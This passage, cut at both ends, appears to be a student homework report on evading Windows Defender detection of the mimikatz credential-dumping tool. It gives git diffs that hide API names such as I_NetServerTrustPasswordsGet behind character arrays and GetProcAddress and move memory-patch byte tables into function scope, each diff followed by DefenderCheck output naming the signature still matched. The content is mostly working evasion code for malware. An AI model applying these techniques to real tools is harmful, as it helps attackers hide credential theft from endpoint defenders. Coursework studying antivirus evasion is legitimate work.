+		typedef NTSTATUS(WINAPI *LLAP_t) (
+			HANDLE LsaHandle,
+			PLSA_STRING PackageName,
+			PULONG AuthenticationPackage
+		);
+		char sLLAP[] = { 'L', 's', 'a', 'L', 'o', 'o', 'k', 'u', 'p', 'A', 'u', 't', 'h', 'e', 'n', 't', 'i', 'c', 'a', 't', 'i', 'o', 'n', 'P', 'a', 'c', 'k', 'a', 'g', 'e', 0x0 };
+		LLAP_t LLAP = (LLAP_t)GetProcAddress(ntlib, sLLAP);
+		status = LLAP(g_hLSA, &kerberosPackageName, &g_AuthenticationPackageId_Kerberos);
 		g_isAuthPackageKerberos = NT_SUCCESS(status);
+		FreeLibrary(ntlib);
 	}
 	return status;
 }
```
### 24.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1421312 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x145E2F in the original file
File matched signature: "HackTool:Win32/Mimikatz.D"

00000000   73 00 00 09 00 4E 74 53  65 74 53 79 73 74 65 6D   s����NtSetSystem
00000010   45 6E 76 69 72 6F 6E 6D  65 6E 74 56 61 6C 75 65   EnvironmentValue
00000020   45 78 00 05 00 4E 74 51  75 65 72 79 53 79 73 74   Ex���NtQuerySyst
00000030   65 6D 45 6E 76 69 72 6F  6E 6D 65 6E 74 56 61 6C   emEnvironmentVal
00000040   75 65 45 78 00 01 00 4E  74 45 6E 75 6D 65 72 61   ueEx���NtEnumera
00000050   74 65 53 79 73 74 65 6D  45 6E 76 69 72 6F 6E 6D   teSystemEnvironm
00000060   65 6E 74 56 61 6C 75 65  73 45 78 00 00 1F 00 52   entValuesEx����R
00000070   74 6C 49 70 76 34 41 64  64 72 65 73 73 54 6F 53   tlIpv4AddressToS
00000080   74 72 69 6E 67 57 00 20  00 52 74 6C 49 70 76 36   tringW� �RtlIpv6
00000090   41 64 64 72 65 73 73 54  6F 53 74 72 69 6E 67 57   AddressToStringW
000000A0   00 6E 74 64 6C 6C 2E 64  6C 6C 00 01 00 49 5F 4E   �ntdll.dll���I_N
000000B0   65 74 53 65 72 76 65 72  52 65 71 43 68 61 6C 6C   etServerReqChall
000000C0   65 6E 67 65 00 00 00 49  5F 4E 65 74 53 65 72 76   enge���I_NetServ
000000D0   65 72 41 75 74 68 65 6E  74 69 63 61 74 65 32 00   erAuthenticate2�
000000E0   00 02 00 49 5F 4E 65 74  53 65 72 76 65 72 54 72   ���I_NetServerTr
000000F0   75 73 74 50 61 73 73 77  6F 72 64 73 47 65 74 00   ustPasswordsGet�
```


## 25.patch
### 25.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
index 39569a4..867cd1a 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.c
@@ -2068,7 +2068,10 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 									{
 										kuhl_m_lsadump_netsync_AddTimeStampForAuthenticator(&ClientCredential, 0x10, &ClientAuthenticator, sessionKey);
 										//kprintf(L"> ClientAuthenticator (%u)  : ", kuhl_m_lsadump_netsync_sc[i]); kull_m_string_wprintf_hex(ClientAuthenticator.Credential.data, sizeof(ClientAuthenticator.Credential.data), 0); kprintf(L" (%u - 0x%08x)\n", ClientAuthenticator.Timestamp, ClientAuthenticator.Timestamp);
-										status = I_NetServerTrustPasswordsGet((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
+										HMODULE netapi = LoadLibrary(L"netapi32.dll");
+										char sINSTPG[] = { 'I', '_', 'N', 'e', 't', 'S', 'e', 'r', 'v', 'e', 'r', 'T', 'r', 'u', 's', 't', 'P', 'a', 's', 's', 'w', 'o', 'r', 'd', 's', 'G', 'e', 't', 0x0 };
+										I_NetServerTrustPasswordsGet_t INSTPG = (I_NetServerTrustPasswordsGet_t)GetProcAddress(netapi, sINSTPG);
+										status = INSTPG((LOGONSRV_HANDLE) szDc, (wchar_t *) szAccount, kuhl_m_lsadump_netsync_sc[i], (wchar_t *) szComputer, &ClientAuthenticator, &ServerAuthenticator, &EncryptedNewOwfPassword, &EncryptedOldOwfPassword);
 										if(NT_SUCCESS(status))
 										{
 											kprintf(L"  Account: %s\n", szAccount);
@@ -2082,6 +2085,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 											}
 										}
 										*(PDWORD64) ClientCredential.data += 1; // lol :) validate server auth
+										FreeLibrary(netapi);
 									}
 									if(!NT_SUCCESS(status))
 										PRINT_ERROR(L"I_NetServerTrustPasswordsGet (0x%08x)\n", status);
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.h b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.h
index 71976be..a7294b6 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.h
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_lsadump.h
@@ -514,7 +514,17 @@ void kuhl_m_lsadump_lsa_DescrBuffer(DWORD type, DWORD rid, PVOID Buffer, DWORD B
 
 extern NTSTATUS WINAPI I_NetServerReqChallenge(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * ComputerName, IN PNETLOGON_CREDENTIAL ClientChallenge, OUT PNETLOGON_CREDENTIAL ServerChallenge);
 extern NTSTATUS WINAPI I_NetServerAuthenticate2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t * ComputerName, IN PNETLOGON_CREDENTIAL ClientCredential, OUT PNETLOGON_CREDENTIAL ServerCredential, IN OUT ULONG * NegotiateFlags);
-extern NTSTATUS WINAPI I_NetServerTrustPasswordsGet(IN LOGONSRV_HANDLE TrustedDcName, IN wchar_t* AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t* ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword);
+//extern NTSTATUS WINAPI I_NetServerTrustPasswordsGet(IN LOGONSRV_HANDLE TrustedDcName, IN wchar_t* AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t* ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword, OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword);
+typedef NTSTATUS (WINAPI *I_NetServerTrustPasswordsGet_t) (
+	IN LOGONSRV_HANDLE TrustedDcName,
+	IN wchar_t* AccountName,
+	IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,
+	IN wchar_t* ComputerName,
+	IN PNETLOGON_AUTHENTICATOR Authenticator,
+	OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator,
+	OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedNewOwfPassword,
+	OUT PENCRYPTED_NT_OWF_PASSWORD EncryptedOldOwfPassword
+);
 extern NTSTATUS WINAPI I_NetServerPasswordSet2(IN LOGONSRV_HANDLE PrimaryName, IN wchar_t * AccountName, IN NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType, IN wchar_t * ComputerName, IN PNETLOGON_AUTHENTICATOR Authenticator, OUT PNETLOGON_AUTHENTICATOR ReturnAuthenticator, IN PNL_TRUST_PASSWORD ClearNewPassword);
 extern NTSTATUS NTAPI LsaOpenSecret(__in LSA_HANDLE PolicyHandle, __in PLSA_UNICODE_STRING SecretName, __in ACCESS_MASK DesiredAccess, __out PLSA_HANDLE SecretHandle);
 extern NTSTATUS NTAPI LsaSetSecret(__in LSA_HANDLE SecretHandle, __in_opt PLSA_UNICODE_STRING CurrentValue, __in_opt PLSA_UNICODE_STRING OldValue);
```
### 25.2: test.bat
```c:\Users\user\Downloads\homeworks\hw9-group9\files\mimikatz>..\DefenderCheck.exe x64\mimikatz.exe 
Target file size: 1421312 bytes
Analyzing...

[!] Identified end of bad bytes at offset 0x147ADF in the original file
File matched signature: "HackTool:Win64/Mimikatz.B"

00000000   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
00000010   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
00000020   00 63 45 00 00 00 00 00  00 06 00 00 00 00 00 00   �cE�������������
00000030   00 B4 8E 14 40 01 00 00  00 01 00 00 00 00 00 00   �'?�@�����������
00000040   00 E9 8C 14 40 01 00 00  00 05 00 00 00 00 00 00   ��?�@�����������
00000050   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
00000060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
00000070   00 0C 0E 72 00 F6 46 24  02 0F 84 00 00 00 00 00   ���r��F$��?�����
00000080   00 28 0A 00 00 00 00 00  00 06 00 00 00 00 00 00   �(��������������
00000090   00 B0 91 14 40 01 00 00  00 01 00 00 00 00 00 00   ��?�@�����������
000000A0   00 E9 8C 14 40 01 00 00  00 05 00 00 00 00 00 00   ��?�@�����������
000000B0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
000000C0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00   ����������������
000000D0   00 0C 0E 0F 82 0C 00 40  00 00 75 00 00 F6 43 28   ����?��@��u���C(
000000E0   02 0F 85 00 00 90 E9 00  00 F6 43 24 02 75 00 00   ��?��?����C$�u��
000000F0   00 F6 46 24 02 75 00 00  00 F6 46 24 0A 0F 84 00   ��F$�u����F$��?�
```


## 26.patch
### 26.1: git diff -p
```diff --git a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
index 1ccebba..3c14293 100644
--- a/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
+++ b/files/mimikatz/mimikatz/modules/crypto/kuhl_m_crypto_patch.c
@@ -103,45 +103,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BYTE PATC_WALL_SPCryptExportKey_EXPORT[]	= {0xeb};
-BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[]= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-BYTE PTRN_WI60_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85};
-BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x43, 0x28, 0x02, 0x75};
-BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x43, 0x24, 0x02, 0x75};
-BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x46, 0x24, 0x02, 0x75};
-BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x02, 0x0f, 0x84};
-BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x46, 0x24, 0x0a, 0x0f, 0x84};
-BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84};
-BYTE PATC_WI60_SPCryptExportKey_EXPORT[]	= {0x90, 0xe9};
-KULL_M_PATCH_GENERIC CngReferences[] = {
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-};
-#elif defined _M_IX86
-BYTE PTRN_WNO8_SPCryptExportKey[]			= {0xf6, 0x41, 0x20, 0x02, 0x75};
-BYTE PTRN_WI80_SPCryptExportKey[]			= {0xf6, 0x47, 0x1c, 0x02, 0x75};
-BYTE PTRN_WI81_SPCryptExportKey[]			= {0xf6, 0x43, 0x1c, 0x02, 0x75};
-BYTE PTRN_W10_1607_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84};
-BYTE PTRN_W10_1703_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x0a, 0x0f, 0x84};
-BYTE PTRN_W10_1809_SPCryptExportKey[]		= {0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84};
-KULL_M_PATCH_GENERIC CngReferences[] = {
-	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-	{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
-};
-#endif
+
 NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 {
 	NCRYPT_PROV_HANDLE hProvider;
@@ -149,6 +111,45 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 	{
 		if(NT_SUCCESS(NCryptOpenStorageProvider(&hProvider, NULL, 0)))
 		{
+			BYTE PATC_WALL_SPCryptExportKey_EXPORT[] = { 0xeb };
+			BYTE PATC_W10_1607_SPCryptExportKey_EXPORT[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
+#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
+			BYTE PTRN_WI60_SPCryptExportKey[] = { 0xf6, 0x43, 0x28, 0x02, 0x0f, 0x85 };
+			BYTE PTRN_WNO8_SPCryptExportKey[] = { 0xf6, 0x43, 0x28, 0x02, 0x75 };
+			BYTE PTRN_WI80_SPCryptExportKey[] = { 0xf6, 0x43, 0x24, 0x02, 0x75 };
+			BYTE PTRN_WI81_SPCryptExportKey[] = { 0xf6, 0x46, 0x24, 0x02, 0x75 };
+			BYTE PTRN_W10_1607_SPCryptExportKey[] = { 0xf6, 0x46, 0x24, 0x02, 0x0f, 0x84 };
+			BYTE PTRN_W10_1703_SPCryptExportKey[] = { 0xf6, 0x46, 0x24, 0x0a, 0x0f, 0x84 };
+			BYTE PTRN_W10_1809_SPCryptExportKey[] = { 0xf6, 0x45, 0x24, 0x02, 0x0f, 0x84 };
+			BYTE PATC_WI60_SPCryptExportKey_EXPORT[] = { 0x90, 0xe9 };
+			KULL_M_PATCH_GENERIC CngReferences[] = {
+				{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WI60_SPCryptExportKey),	PTRN_WI60_SPCryptExportKey},	{sizeof(PATC_WI60_SPCryptExportKey_EXPORT), PATC_WI60_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1909,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+			};
+#elif defined _M_IX86
+			BYTE PTRN_WNO8_SPCryptExportKey[] = { 0xf6, 0x41, 0x20, 0x02, 0x75 };
+			BYTE PTRN_WI80_SPCryptExportKey[] = { 0xf6, 0x47, 0x1c, 0x02, 0x75 };
+			BYTE PTRN_WI81_SPCryptExportKey[] = { 0xf6, 0x43, 0x1c, 0x02, 0x75 };
+			BYTE PTRN_W10_1607_SPCryptExportKey[] = { 0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84 };
+			BYTE PTRN_W10_1703_SPCryptExportKey[] = { 0xf6, 0x47, 0x1c, 0x0a, 0x0f, 0x84 };
+			BYTE PTRN_W10_1809_SPCryptExportKey[] = { 0xf6, 0x47, 0x1c, 0x02, 0x0f, 0x84 };
+			KULL_M_PATCH_GENERIC CngReferences[] = {
+				{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_SPCryptExportKey),	PTRN_WNO8_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WI81_SPCryptExportKey),	PTRN_WI81_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1507,	{sizeof(PTRN_WI80_SPCryptExportKey),	PTRN_WI80_SPCryptExportKey},	{sizeof(PATC_WALL_SPCryptExportKey_EXPORT), PATC_WALL_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_W10_1607_SPCryptExportKey),PTRN_W10_1607_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1703,	{sizeof(PTRN_W10_1703_SPCryptExportKey),PTRN_W10_1703_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+				{KULL_M_WIN_BUILD_10_1809,	{sizeof(PTRN_W10_1809_SPCryptExportKey),PTRN_W10_1809_SPCryptExportKey},{sizeof(PATC_W10_1607_SPCryptExportKey_EXPORT), PATC_W10_1607_SPCryptExportKey_EXPORT}, {4}},
+			};
+#endif
 			NCryptFreeObject(hProvider);
 			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
 		}
diff --git a/files/mimikatz/mimikatz/modules/kuhl_m_sid.c b/files/mimikatz/mimikatz/modules/kuhl_m_sid.c
index fa9b6ab..75acf46 100644
--- a/files/mimikatz/mimikatz/modules/kuhl_m_sid.c
+++ b/files/mimikatz/mimikatz/modules/kuhl_m_sid.c
@@ -198,34 +198,6 @@ NTSTATUS kuhl_m_sid_clear(int argc, wchar_t * argv[])
 	return STATUS_SUCCESS;
 }
 
-BYTE PTRN_JMP[]			= {0xeb};
-BYTE PTRN_JMP_NEAR[]	= {0x90, 0xe9};
-BYTE PTRN_6NOP[]		= {0x90, 0x90, 0x90, 0x90, 0x90, 0x90};
-#if defined(_M_X64)
-// LocalModify:SampModifyLoopbackCheck
-BYTE PTRN_WN52_LoopBackCheck[]	= {0x48, 0x8b, 0xd8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x07, 0x01, 0x00, 0x00, 0x00, 0x83};
-BYTE PTRN_WN61_LoopBackCheck[]	= {0x48, 0x8b, 0xf8, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x33, 0x33, 0xdb, 0x39};
-BYTE PTRN_WN81_LoopBackCheck[]	= {0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x45, 0x89, 0x34, 0x24, 0x83};
-BYTE PTRN_WN10_1607_LoopBackCheck[]	= {0x44, 0x8d, 0x70, 0x01, 0x45, 0x89, 0x34, 0x24, 0x39, 0x05};
-KULL_M_PATCH_GENERIC LoopBackCheckReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_LoopBackCheck),	PTRN_WN52_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {24}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_LoopBackCheck),	PTRN_WN61_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {28}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_LoopBackCheck),	PTRN_WN81_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {17}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_LoopBackCheck),	PTRN_WN10_1607_LoopBackCheck},	{sizeof(PTRN_JMP), PTRN_JMP}, {14}},
-};
-// ModSetAttsHelperPreProcess:SysModReservedAtt
-BYTE PTRN_WN52_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
-BYTE PTRN_WN61_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0x78, 0x01, 0x00, 0x00, 0x4d, 0x8b, 0x6d, 0x00};
-BYTE PTRN_WN81_SysModReservedAtt[] = {0x0f, 0xb7, 0x8c, 0x24, 0xb8, 0x00, 0x00, 0x00};
-BYTE PTRN_WN10_1607_SysModReservedAtt[]	= {0x8b, 0xbc, 0x24, 0xd8, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x01, 0x00, 0x00, 0x00, 0x0f, 0xb7, 0x8c, 0x24, 0xc8, 0x00, 0x00, 0x00};
-KULL_M_PATCH_GENERIC SysModReservedAttReferences[] = {
-	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_SysModReservedAtt),	PTRN_WN52_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
-	{KULL_M_WIN_BUILD_7,		{sizeof(PTRN_WN61_SysModReservedAtt),	PTRN_WN61_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
-	{KULL_M_WIN_BUILD_BLUE,		{sizeof(PTRN_WN81_SysModReservedAtt),	PTRN_WN81_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
-	{KULL_M_WIN_BUILD_10_1607,	{sizeof(PTRN_WN10_1607_SysModReservedAtt),	PTRN_WN10_1607_SysModReservedAtt},	{sizeof(PTRN_6NOP), PTRN_6NOP}, {-6}},
-};
-#elif defined(_M_IX86)
-#endif
 NTSTATUS kuhl_m_sid_patch(int argc, wchar_t * argv[])
 {
 	PCWSTR service, lib;
@@ -240,6 +212,34 @@ NTSTATUS kuhl_m_sid_patch(int argc, wchar_t * argv[])
 		lib = L"ntdsai.dll";
 	}
 	kprintf(L"Patch 1/2: ");
+	BYTE PTRN_JMP[] = { 0xeb };
+	BYTE PTRN_JMP_NEAR[] = { 0x90, 0xe9 };
+	BYTE PTRN_6NOP[] = { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };
+#if defined(_M_X64)
+	// LocalModify:SampModifyLoopbackCheck
+	BYTE PTRN_WN52_LoopBackCheck[] = { 0x48, 0x8b, 0xd8, 0x48, 0x89, 0x84, 0x24, 0x80, 0x00, 0x00, 0x00, 0xc7, 0x07, 0x01, 0x00, 0x00, 0x00, 0x83 };
+	BYTE PTRN_WN61_LoopBackCheck[] = { 0x48, 0x8b, 0xf8, 0x48, 0x89, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x33, 0x33, 0xdb, 0x39 };
+	BYTE PTRN_WN81_LoopBackCheck[] = { 0x41, 0xbe, 0x01, 0x00, 0x00, 0x00, 0x45, 0x89, 0x34, 0x24, 0x83 };
+	BYTE PTRN_WN10_1607_LoopBackCheck[] = { 0x44, 0x8d, 0x70, 0x01, 0x45, 0x89, 0x34, 0x24, 0x39, 0x05 };
+	KULL_M_PATCH_GENERIC LoopBackCheckReferences[] = {
+		{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WN52_LoopBackCheck),	PTRN_WN52_LoopBackCheck},	{sizeof(PTRN_JMP_NEAR), PTRN_JMP_NEAR}, {24}},
